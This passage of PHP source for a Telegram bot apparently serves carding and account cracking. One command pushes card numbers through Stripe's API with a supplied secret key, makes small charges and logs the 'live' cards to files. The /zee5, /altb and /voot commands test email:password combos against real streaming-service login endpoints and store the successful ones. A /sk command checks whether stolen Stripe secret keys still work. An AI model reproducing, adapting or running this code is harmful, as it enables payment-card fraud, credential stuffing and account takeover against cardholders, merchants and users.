$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-Type: application/x-www-form-urlencoded',));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=Alina Rebeckert');
$f = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
$id = trim(strip_tags(GetStr($f,'"id": "','"')));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-Type: application/x-www-form-urlencoded',));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&customer='.$id.'&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mon.'&payment_method_data[card][exp_year]='.$year.'&payment_method_data[card][cvc]='.$cvv.'');
$result = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
$c = json_decode(curl_exec($ch), true);
curl_close($ch);
$pam = trim(strip_tags(GetStr($result,'"payment_method": "','"')));
$cvv = trim(strip_tags(GetStr($result,'"cvc_check": "','"')));
if ($c["status"] == "succeeded"){ 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');  
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');  
$result = curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/'.$pam.'/attach'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-Type: application/x-www-form-urlencoded'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$id.'');
$result = curl_exec($ch);
$attachment_to_her = json_decode(curl_exec($ch), true);
curl_close($ch);
$attachment_to_her;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-Type: application/x-www-form-urlencoded'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '&amount=100&currency=usd&customer='.$id.'');
$result = curl_exec($ch);
if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "pass"){  
$skresult = "✅APPROVED!";
$skresponse = "CVV MATCHED!";
fwrite(fopen('ani_live_cvc_storage.txt', 'a'), $lista."\r\n");
}else{
$skresult = "UNCHECKED";
$skresponse = "PLEASE RECHECK!";
}}
elseif(strpos($result, '"cvc_check": "pass"')){
$skresult = "✅APPROVED!";
$skresponse = "LIVE CC!";
fwrite(fopen('ani_live_cvc_storage.txt', 'a'), $lista."\r\n");
}
elseif(strpos($result, 'insufficient_funds' )) {
$skresult = "✅APPROVED!";
$skresponse = "INSUFFICIENT FUNDS!";
fwrite(fopen('ani_live_cvc_storage.txt', 'a'), $lista."\r\n");
}
elseif(strpos($result, 'security code is incorrect')){
$skresult = "✅APPROVED!";
$skresponse = "CCN APPROVED!";
fwrite(fopen('ani_live_ccn_storage.txt', 'a'), $lista."\r\n");
}
elseif(strpos($result,'"code": "incorrect_cvc"')){
$skresult = "✅APPROVED!";
$skresponse = "CCN LIVE!";
fwrite(fopen('ani_live_ccn_storage.txt', 'a'), $lista."\r\n");
}
elseif (isset($c["error"])){
$skresult = "❌DECLINED!";
$skresponse = ''. $c["error"]["message"] . ' ' . $c["error"]["decline_code"] .'';
}else{
$skresult = "UNCHECKED";
$skresponse = "PLEASE RECHECK!";
};
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);

sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>'.$skresult.'</b>%0A<u>RESPONSE:</u> <b>'.$skresponse.'</b>%0A%0A----- BIN Data -----%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A--------------------<u>%0A%0AChecked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}

//////////=========[Zee5 Command]=========//////////

elseif (strpos($message, "/zee5") === 0){
$combo = substr($message, 6);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Kolkata');
$date1 = date('yy-m-d');
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;
};
$email = multiexplode(array(":", "|", ""), $combo)[0];
$pass = multiexplode(array(":", "|", ""), $combo)[1];
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

///////////////////////===========[Login Check]============/////////////////////

$resultmann = file_get_contents('https://userapi.zee5.com/v1/user/loginemail?email='.$email.'&password='.$pass.'');
$token = trim(strip_tags(GetStr($resultmann,'{"token":"','"}')));

/////////////////===============[Result]===========///////////////////

if($token){
    fwrite(fopen('ani_zee5_storage.txt', 'a'), $combo.""."\r\n");
sendMessage($chatId, "<b>ZEE5 Account:</b>%0A<b>Combo:</b> <code>$combo</code>%0A<b>Response:</b> <b>✅Successfully Logged in</b>%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}else{
sendMessage($chatId, "<b>Combo:</b> <code>$combo</code>%0A<b>Response:</b> <b>❌Wrong Email or Password</b>%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
};
curl_close($ch);
ob_flush();
}








///////////////// ALT BALAJI TEST ////////////////////////////////////////////
elseif (strpos($message, "/altb") === 0){
$combo = substr($message, 6);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Kolkata');
$date1 = date('yy-m-d');

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$mail = multiexplode(array(":", "|", ""), $combo)[0];
$pass = multiexplode(array(":", "|", ""), $combo)[1];
function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
# --------------- [1st Req] ------------ #

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.cloud.altbalaji.com/accounts/lookup?login='.$mail.'&domain=IN&timestamp=1610612178656');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.cloud.altbalaji.com',
'method: POST',
'path: /accounts/lookup?login='.$mail.'&domain=IN&timestamp=1610612178656',
'scheme: https',
'accept: application/json, text/plain, */*',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6,fr;q=0.5,pt;q=0.4',
'accept-encoding: gzip, deflate, br',
'content-type: application/json;charset=UTF-8',
'origin: https://www.altbalaji.com',
'referer: https://www.altbalaji.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.40 Safari/537.36 Edg/87.0.664.24',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'login='.$mail.'&domain=IN&timestamp=1610612178656');

$result = curl_exec($ch);



# --------------- [2nd Req] ------------ #

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.cloud.altbalaji.com/accounts/login?domain=IN');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.cloud.altbalaji.com',
'method: POST',
'path: /accounts/login?domain=IN',
'scheme: https',
'accept: application/json, text/plain, */*',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6,fr;q=0.5,pt;q=0.4',
'content-type: application/json; charset=utf-8',
'origin: https://www.altbalaji.com',
'referer: https://www.altbalaji.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.40 Safari/537.36 Edg/87.0.664.24',
'x-requested-with: XMLHttpRequest',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"username":"'.$mail.'","password":"'.$pass.'"}');

$result1 = curl_exec($ch);

////////////////////////////===[Account Responses]

if (strpos($result1, 'ok')) {
  sendMessage($chatId, "<b>ALT BALAJI Account:</b>%0A<b>Combo:</b> <code>$combo</code>%0A<b>Response:</b> <b>✅Successfully Logged in</b>%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}

elseif (strpos($result1, '404')) {
  sendMessage($chatId, "<b>ALT BALAJI Account:</b>%0A<b>Combo:</b> <code>$combo</code>%0A<b>Response:</b> <b>INCORRECT CREDENTIALS :(</b>%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}

else {
  sendMessage($chatId, "<b>ALT BALAJI Account:</b>%0A<b>Combo:</b> <code>$combo</code>%0A<b>Response:</b> <b>PLEASE TRY AGAIN</b>%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}
curl_close($ch);
ob_flush();
}
///////////////// VOOT TEST ////////////////////////////////////////////
elseif (strpos($message, "/voot") === 0){
$combo = substr($message, 6);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Kolkata');
$date1 = date('yy-m-d');

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$mail = multiexplode(array(":", "|", ""), $combo)[0];
$pass = multiexplode(array(":", "|", ""), $combo)[1];
function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
# --------------- [1st Req] ------------ #

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://userauth.voot.com/usersV3/v3/login');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: userauth.voot.com',
'method: POST',
'path: /usersV3/v3/login',
'scheme: https',
'accept: application/json, text/plain, */*',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6,fr;q=0.5,pt;q=0.4',
'accept-encoding: gzip, deflate, br',
'content-type: application/json;charset=UTF-8',
'origin: https://www.voot.com',
'referer: https://www.voot.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.40 Safari/537.36 Edg/87.0.664.24',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"type":"traditional","deviceId":"Windows NT 10.0","deviceBrand":"PC/MAC","data":{"email":"'.$mail.'","password":"'.$pass.'"}}');

$result = curl_exec($ch);
$token = trim(strip_tags(getStr($result,'"accessToken":"','"')));



# --------------- [2nd Req] ------------ #

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://pxapi.voot.com/smsv4/int/ps/v1/voot/user/entitlement/status');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: pxapi.voot.com',
'method: POST',
'path: /smsv4/int/ps/v1/voot/user/entitlement/status',
'scheme: https',
'accept: application/json, text/plain, */*',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6,fr;q=0.5,pt;q=0.4',
'content-type: application/json; charset=utf-8',
'accesstoken: '.$token.'',
'origin: https://www.voot.com',
'referer: https://www.voot.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.40 Safari/537.36 Edg/87.0.664.24',
'x-requested-with: XMLHttpRequest',
));

$result1 = curl_exec($ch);

////////////////////////////===[Account Responses]

if (strpos($result, 'data')) {
  sendMessage($chatId, "<b>VOOT Account:</b>%0A<b>Combo:</b> <code>$combo</code>%0A<b>Response:</b> <b>✅Successfully Logged in</b>%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}

elseif (strpos($result, 'That’s an incorrect password. Please try again.')) {
  sendMessage($chatId, "<b>VOOT Account:</b>%0A<b>Combo:</b> <code>$combo</code>%0A<b>Response:</b> <b>INCORRECT CREDENTIALS :(</b>%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}

else {
  sendMessage($chatId, "<b>VOOT Account:</b>%0A<b>Combo:</b> <code>$combo</code>%0A<b>Response:</b> <b>USER DOESNT EXIST/ PLEASE TRY AGAIN</b>%0A<b>Checked By:</b> @$username%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}
curl_close($ch);
ob_flush();
}


//////////=========[Sk Key Check Command]=========//////////

elseif ((strpos($message, "!sk") === 0)||(strpos($message, "/sk") === 0)){
$sec = substr($message, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}else{
    fwrite(fopen('ani_sk_live_storage.txt', 'a'), $sec.""."\r\n");
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}}


////////////////////////////////////////////////////////////////////////////////////////////////

function sendMessage ($chatId, $message, $message_id){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);
};

////////////////=============[Aniruddh]===============////////////////
////////==========[Used api raw bot of @Zeltraxrockzzz]============////////

?>
